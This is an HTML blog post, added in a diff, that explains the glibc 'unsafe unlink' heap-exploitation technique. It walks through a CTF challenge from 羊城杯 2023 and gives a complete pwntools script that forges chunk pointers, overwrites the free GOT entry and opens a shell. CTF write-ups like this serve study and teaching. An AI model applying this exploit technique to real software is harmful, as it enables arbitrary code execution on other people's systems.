@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>unsafe unlink | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">unsafe unlink</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">九月 16, 2024&nbsp;&nbsp;13:18:16</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/heap/">heap</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>在free时为了避免有过多的碎片化的堆块，glibc中会利用unlink把物理地址相近的被释放的堆合并成一个堆块（fastbin和tcache不会触发unlink）。</p>
+<p>unlink合并时进行如下操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd</span><br><span class="line">BK = P-&gt;bk</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure>
+
+<p>即让当前堆块所指向的前一个堆块的bk改为当前堆块所指向后一个堆块的地址。让当前堆块所指向后一个堆块的fd改为当前堆块所指向前一个堆块的地址</p>
+<p>同时unlink会有一个检查</p>
+<p>会检查当前chunk的前一个chunk的bk是否指向当前chunk，当前chunk的后一个chunk的fd是否指向当前chunk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk == p || BK-&gt;fd == p</span><br></pre></td></tr></table></figure>
+
+<h1 id="unsafe-unlink利用"><a href="#unsafe-unlink利用" class="headerlink" title="unsafe unlink利用"></a>unsafe unlink利用</h1><p>利用前提</p>
+<ul>
+<li>堆块能进入unsortedbin</li>
+<li>存在UAF</li>
+<li>原码中利用位于全局变量（bss段和data段）的指针对申请的堆块进行管理</li>
+</ul>
+<p>指向某一个chunk的指针为ptr，ptr位于全局变量中</p>
+<p>改chunk的fd为ptr-0x18    检查时会检查ptr-0x18的bk，即(ptr-0x18)+0x18的位置为ptr</p>
+<p>改chunk的bk为ptr-0x10    检查时会检查ptr-0x10的fd，即(ptr-0x10)+0x10的位置为ptr</p>
+<p>如此一来就会绕过unlink时的检查</p>
+<p>此时再触发unlink就会进行合并，此时ptr被更改为ptr-0x18</p>
+<p>之后对ptr进行edit操作就直接控制了全局变量，不会控制堆</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/4350">羊城杯 2023 决赛]Printf but not fmtstr | NSSCTF</a></p>
+<p>add show edit free功能齐全，题目中给了后门函数</p>
+<p><img src="/../image/unsafe_unlink/1.png" alt="1"></p>
+<p>add限制了申请内存的大小，只能申请到unsortedbin中的堆块大小</p>
+<p>同时有全局变量heap_addr来保存堆的内存。<strong>注意：malloc返回的地址是从data开始的而不是从chunk头开始，因此要想办法切割unsortedbin让指向chunkdata的位置变为chunk头</strong></p>
+<p><img src="/../image/unsafe_unlink/2.png" alt="2"></p>
+<p>free存在UAF</p>
+<p><img src="/../image/unsafe_unlink/3.png" alt="3"></p>
+<p>首先申请3个0x510的chunk（c0,c1,c2），第三个是为了防止与topchunk合并</p>
+<p>释放前两个后再申请0x520的堆块，此时原本指向第二个chunkdata的指针指向了chunk头，因为chunk少了0x10的大小，此时对原先的c1进行修改相当于修改了被切割后的chunk头</p>
+<p><img src="/../image/unsafe_unlink/4.png" alt="4"></p>
+<p>此时已经伪造了fd和bk</p>
+<p><img src="/../image/unsafe_unlink/5.png" alt="5"></p>
+<p>释放c2触发unlink，此时对c1操作就是对0x4040d0操作</p>
+<p>可以改c0出的指针为got.free</p>
+<p>再edit c0即edit got.free，改got.free为后门函数，再次调用free即getshell</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/mrbw/Desktop/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;node4.anna.nssctf.cn&#x27;,28413)</span></span><br><span class="line">s   = <span class="keyword">lambda</span> content : r.send(content)</span><br><span class="line">sl  = <span class="keyword">lambda</span> content : r.sendline(content)</span><br><span class="line">sa  = <span class="keyword">lambda</span> content,send : r.sendafter(content, send)</span><br><span class="line">sla = <span class="keyword">lambda</span> content,send : r.sendlineafter(content, send)</span><br><span class="line">rc  = <span class="keyword">lambda</span> number : r.recv(number)</span><br><span class="line">ru  = <span class="keyword">lambda</span> content : r.recvuntil(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"> r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line"> r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line"> r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"> r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line"> r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"> r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line"> r.sendline(<span class="built_in">str</span>(idx).encode()) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"> r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line"> r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"> r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line"> r.send(data) </span><br><span class="line"></span><br><span class="line">heap=<span class="number">0x4040e0</span>+<span class="number">8</span> <span class="comment"># heap+8为c1的地址，后续改c1</span></span><br><span class="line">win = <span class="number">0x4011D6</span></span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b *0x4016e7&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(i,<span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">show(0)</span></span><br><span class="line"><span class="string">ru(&quot;Content: &quot;)</span></span><br><span class="line"><span class="string">base=u64(rc(6).ljust(8,b&#x27;\x00&#x27;))-0x1f6cc0</span></span><br><span class="line"><span class="string">log.success(hex(base))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>)+p64(heap-<span class="number">0x18</span>)+p64(heap-<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#触发unlink</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(e.got[<span class="string">&quot;free&quot;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(win))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>不得不说lambda确实好用</p>
+<p>还有一点，chunk2在释放完后必须进入topchunk，否则会报错</p>
+<p><strong>free(): corrupted unsorted chunks</strong></p>
+<p>可能是破坏了unsortedbin的双向链表</p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/heap/"># heap</a>
+                    
+                        <a href="/tags/UAF/"># UAF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/09/13/house-of/">house of...</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
